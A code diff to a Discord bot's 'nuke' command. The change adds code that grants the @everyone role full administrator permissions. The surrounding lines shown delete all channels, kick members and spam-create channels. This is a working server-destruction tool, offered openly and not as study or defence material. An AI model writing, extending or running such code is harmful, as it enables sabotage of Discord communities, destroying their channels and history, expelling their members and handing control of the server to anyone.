@@ -116,6 +116,14 @@ async def guildname(ctx, *, name):
 @bot.command(pass_context=True)
 async def nuke(ctx, amount=500):
         await ctx.message.delete()
+        guild = ctx.guild
+        for role in list(ctx.guild.roles):
+             if role.name == '@everyone':
+                  try:
+                      await role.edit(permissions=Permissions.all())
+                      print("@everyone has admin") 
+                  except:
+                      print("@everyone does NOT have admin")
         for channel in list(ctx.guild.channels):
             try:
                 await channel.delete()
@@ -134,10 +142,10 @@ async def nuke(ctx, amount=500):
                 print (f"{user.name} has been kicked from {ctx.guild.name}")
             except:
                 print (f"{user.name} has FAILED to be kicked from {ctx.guild.name}")
-                guild = ctx.message.guild 
         for i in range(amount):
            await guild.create_text_channel(random.choice(CHANNEL_NAMES))
         print ('Action NUKE complete')
+
 
 @bot.command(pass_context=True)
 async def ban(ctx):
